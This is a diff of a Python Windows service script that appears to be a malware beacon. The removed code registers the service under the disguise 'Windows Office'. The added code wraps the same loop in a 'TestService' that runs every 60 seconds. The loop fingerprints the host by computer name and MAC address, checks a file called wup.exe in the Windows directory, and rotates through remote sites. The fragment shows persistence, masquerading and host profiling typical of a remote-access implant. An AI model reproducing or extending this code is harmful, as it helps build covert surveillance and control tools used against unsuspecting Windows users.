@@ -13,15 +13,15 @@ import os
 #import ecdsa
 #import paramiko
 import subprocess
-import httplib
+import http.client
 import requests
-import urllib2
+import urllib3
 #import pycurl
 from os import path, access, R_OK
 from uuid import getnode as get_mac
 from subprocess import Popen
-from fake_useragent import UserAgent
-import requests
+#from fake_useragent import UserAgent
+
 #import logging
 #from logging.handlers import RotatingFileHandler
 
@@ -124,35 +124,37 @@ try:
     #myloop()
 except Exception as e:
     print (str(e))
-class AppServerSvc (win32serviceutil.ServiceFramework):
-    _svc_name_ = "wofficeie"
-    _svc_display_name_ = "Windows Office"
+#class AppServerSvc (win32serviceutil.ServiceFramework):
+#    _svc_name_ = "wofficeie"
+#    _svc_display_name_ = "Windows Office"
 
-    def __init__(self,args):
-        win32serviceutil.ServiceFramework.__init__(self,args)
-        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
+#    def __init__(self,args):
+#        win32serviceutil.ServiceFramework.__init__(self,args)
+#        self.hWaitStop = win32event.CreateEvent(None,0,0,None)
 
-    def SvcStop(self):
-        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
-        win32event.SetEvent(self.hWaitStop)
-    def SvcDoRun(self):
-        #print getProxy()
-        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
+#    def SvcStop(self):
+#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+#        win32event.SetEvent(self.hWaitStop)
+#    def SvcDoRun(self):
+#        #print getProxy()        
+#        self.ReportServiceStatus(win32service.SERVICE_RUNNING)
         
-        Init()
+#        Init()
         
         #self.stopping = False
 
         #while not self.stopping:
         
-        while True:
-            try:
-               myloop() 
-               time.sleep(60)
-            except Exception as e:
-               print (str(e)) 
-               time.sleep(60)
-               myloop()      
+#        while True:
+#            try:
+#               myloop() 
+#               time.sleep(60)
+#            except Exception as e:
+#               print (str(e)) 
+#               time.sleep(60)
+#               myloop()      
+
+
        
 def Init():
                         #os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
@@ -264,8 +266,9 @@ def myloop():
               #httpServ = httplib.HTTPConnection(site, 80)
               #httpServ.connect()
               
-              mymac = get_mac()
-              smacaddress = get_macaddress('localhost')
+              #mymac = get_mac()
+              #smacaddress = get_macaddress('localhost')
+              smacaddress=str(get_mac())
               sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
               sTime=time.ctime(os.path.getmtime(os.getenv('windir')+"\\wup.exe"))
               sTime=sTime.replace(" ","_")
@@ -444,5 +447,46 @@ def myloop():
                   site=site1
               
 #time.sleep(10)
+class TestService(win32serviceutil.ServiceFramework):
+    _svc_name_ = "TestService"
+    _svc_display_name_ = "Test Service"
+
+    def __init__(self, args):
+        win32serviceutil.ServiceFramework.__init__(self, args)
+        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+        socket.setdefaulttimeout(60)
+
+    def SvcStop(self):
+        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+        win32event.SetEvent(self.hWaitStop)
+
+    def SvcDoRun(self):
+        rc = None
+        Init()
+        while rc != win32event.WAIT_OBJECT_0:
+            with open('C:\\TestService.log', 'a') as f:
+                f.write('test service running...\n')
+            
+            try:
+               myloop() 
+               time.sleep(60)
+            except Exception as e:
+               print (str(e)) 
+               time.sleep(60)
+               myloop() 
+            rc = win32event.WaitForSingleObject(self.hWaitStop, 5000)
+            
+
+
+if __name__ == '__main__':
+    #Init()
+    #myloop()
+    if len(sys.argv) == 1:
+        servicemanager.Initialize()
+        servicemanager.PrepareToHostSingle(TestService)
+        servicemanager.StartServiceCtrlDispatcher()
+    else:
+        win32serviceutil.HandleCommandLine(TestService)
+
 
 
